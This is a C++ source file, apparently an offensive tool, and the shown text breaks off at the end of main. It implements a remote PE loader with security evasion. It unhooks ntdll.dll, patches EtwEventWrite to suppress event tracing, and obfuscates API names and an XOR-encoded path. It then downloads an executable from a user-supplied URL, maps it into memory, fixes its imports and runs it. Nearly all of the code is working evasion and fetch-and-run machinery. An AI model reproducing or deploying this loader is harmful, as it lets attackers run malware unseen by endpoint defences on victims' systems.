#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <vector>
#include <stdint.h>
#include <iostream>
#include <winternl.h>
#include <stdlib.h>
#include <string.h>
#include <metahost.h> 
#include <evntprov.h>

#pragma warning (disable: 4996)
#pragma comment(lib,"WS2_32.lib")

#define PATH MAX_PATH

typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

#define CHUNK_SIZE 200

using namespace std;

#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")
#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "winhttp")

bool hijackCmdline = false;
char* sz_masqCmd_Ansi = NULL, * sz_masqCmd_ArgvAnsi[100] = {  };
wchar_t* sz_masqCmd_Widh = NULL, * sz_masqCmd_ArgvWidh[100] = { };
int int_masqCmd_Argc = 0;
LPWSTR hookGetCommandLineW() { return sz_masqCmd_Widh; }
LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

VirtualProtect_t VirtualProtect_p = NULL;

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };



void XORcrypt(char str2xor[], size_t len, char key) {
    /*
            XORcrypt() is a simple XOR encoding/decoding function
    */
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    /*
        UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
    */
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into ntdll memory
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            // restore original protection settings of ntdll
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            // all is good, time to go home
            return 0;
        }
    }
    // .text section not found?
    return -1;
}

//  try to locate the address of EtwEventWrite function from ntdll.dll module
// nothing get logged using this function.
void DisableETW(void) {
    DWORD oldprotect = 0;

    unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

    // change the protection so we can write to it  
    void* pEventWrite = GetProcAddress(GetModuleHandle(L"ntdll.dll"), (LPCSTR)sEtwEventWrite);

    VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
    // the return from this function will be 0
    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

    VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
}


int __wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = (wchar_t**)sz_masqCmd_ArgvWidh;
    return 0;
}
int __getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = (char**)sz_masqCmd_ArgvAnsi;
    return 0;
}

char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
    //printf("[+] Fix Import Address Table\n");
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
        //printf("    [+] Import DLL: %s\n", lib_name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                //printf("        [V] API %x at %x\n", orginThunk->u1.Ordinal, addr);
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);

                LPSTR func_name = (LPSTR)by_name->Name;
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
                //printf("        [V] API %s at %x\n", func_name, addr);

                if (hijackCmdline && strcmpi(func_name, "GetCommandLineA") == 0)
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                else if (hijackCmdline && strcmpi(func_name, "GetCommandLineW") == 0)
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                else if (hijackCmdline && strcmpi(func_name, "__wgetmainargs") == 0)
                    fieldThunk->u1.Function = (size_t)__wgetmainargs;
                else if (hijackCmdline && strcmpi(func_name, "__getmainargs") == 0)
                    fieldThunk->u1.Function = (size_t)__getmainargs;
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}


void PELoader(char* data, const long long datasize)
{
    //char* arguments = (char*)"aaaaaaa";
    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;

    //printf("  -- 1 GET NT Header\n");
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        printf("[error] Invaild PE.\n");
        exit(0);
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;


    //printf("  -- 2 GET API NtUnmapViewOfSection from ntdll.dll\n");
    HMODULE dll = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

    //printf("  -- 3 VirtualAlloc Memory\n");
    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }
    //printf("  -- 4 FILL the memory block with PEdata\n");
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    //printf("  -- 5 Fix the PE Import addr table (pImageBase:%p)\n", pImageBase);
    RepairIAT(pImageBase);

    //printf("  -- 6 Seek the AddressOfEntryPoint\n");
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    //printf("  -- 7 Rush the PE in Memory (size %ld)(addr %p)(chksum %ud)\n", datasize, retAddr, chksum);
    // No New Thread :
    //((void(*)())retAddr)(); // bad
    //VirtualProtect(preferAddr, ntHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &OldProtect);
    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    

    // create new thread mablanch:
    //printf("this is argument : %s\n", arguments); 
    //HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)retAddr, 0, 0, 0);
    //WaitForSingleObject(hThread, INFINITE); 
}


void NewNtdllPatchETW() {

    int pid = 0;
    HANDLE hProc = NULL;

    unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

    unsigned int sNtdllPath_len = sizeof(sNtdllPath);
    unsigned int sNtdll_len = sizeof(sNtdll);
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

    // open ntdll.dll
    XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
    hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open ntdll.dll
        printf("failed to open ntdll.dll %u", GetLastError());
    }

    // prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed

        CloseHandle(hFile);
        printf("file mapping failed %u", GetLastError());
    }

    // map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        printf("mapping failed %u", GetLastError());
    }

    // remove hooks
    ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pMapping);

    // Clean up.
    UnmapViewOfFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    //printf("PID: %d\n", GetCurrentProcessId());
    //printf("Before disabling ETW\n"); getchar();

    DisableETW();

    //printf("After disabling ETW\n");
}


// 
char* GetPE443(LPCWSTR domain, LPCWSTR path) {
    
    
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession,domain ,
            INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        char* PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            PE[i] = PEbuf[i];
        }
        return PE;
        
}


char* GetPE_HTTPSport(LPCWSTR domain, LPCWSTR path, DWORD port) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            port, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        char* PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            PE[i] = PEbuf[i];
        }
        return PE;

}

char* GetPE80(LPCWSTR domain, LPCWSTR path) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            INTERNET_DEFAULT_HTTP_PORT, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE\n");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        char* PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            PE[i] = PEbuf[i];
        }
        return PE;

}

char* GetPE_HTTPport(LPCWSTR domain, LPCWSTR path, DWORD port) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE\n");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        char* PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            PE[i] = PEbuf[i];
        }
        return PE;

}


int main(int argc, char** argv) {
    

    printf("\n[+] Unhooking\n");
    printf("\n[+] Patch ETW \n");
    NewNtdllPatchETW();

    

    printf("\n[+] Enter the uri :\n");
    char uri[250] = "";
    char argument[100] = "";
    scanf("%s", uri);
    char* PE = NULL;

    if (!strncmp("https:", uri, 6)) {
        printf("\n[+] Loading Remote PE from %s\n", uri);
        char domain[50];
        char path[500];
        sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);

        wchar_t Wdomain[50];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        wchar_t Wpath[500];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
        
        const char* invalid_characters = ":";
        char* mystring = domain;
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[16] = "";
                char strPort[10] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i - j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);

                wchar_t WrealDomain[50];
                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
                //printf("WrealDomain %ws\n", WrealDomain);

                port = atoi(strPort);

                //printf("Wpath %ws\n", Wpath);
                //printf("WrealDomain %ws\n", WrealDomain);
                //printf("port %d\n", port);
                PE = GetPE_HTTPSport(WrealDomain, Wpath, port);

                goto jump;
            }
            j++;
            c++;
        }
        //printf("Wdomain : %ws\n",Wdomain);
        PE = GetPE443(Wdomain, Wpath);
    }
    else if(!strncmp(uri, "http:", 5)) {
        printf("\n[+] Loading Remote PE from %s\n", uri);
        char domain[50];
        char path[500];
        sscanf(uri, "http://%31[^/]/%63[^\n]", domain, path);

        wchar_t Wdomain[50];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        wchar_t Wpath[500];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
        
        const char* invalid_characters = ":";
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[16] = "";
                char strPort[10] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);

                size_t origsize = strlen(realDomain) + 1;
                const size_t newsize = 100;
                size_t convertedChars = 0;
                wchar_t WrealDomain[newsize];
                mbstowcs_s(&convertedChars, WrealDomain, origsize, realDomain, _TRUNCATE);
                //printf("WrealDomain %ws\n", WrealDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i-j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);
                
                
                port = atoi(strPort);
                
                //printf("Wpath %ws\n", Wpath);
                
                //printf("port %d\n", port);
                PE = GetPE_HTTPport(WrealDomain, Wpath, port);
                
                goto jump;
            }
            j++;
            c++;
        }

        //printf("Wdomain : %ws\n",Wdomain);
        //printf("Wpath   : %ws\n", Wpath);
        PE = GetPE80(Wdomain, Wpath);

    
    }
    
    jump:
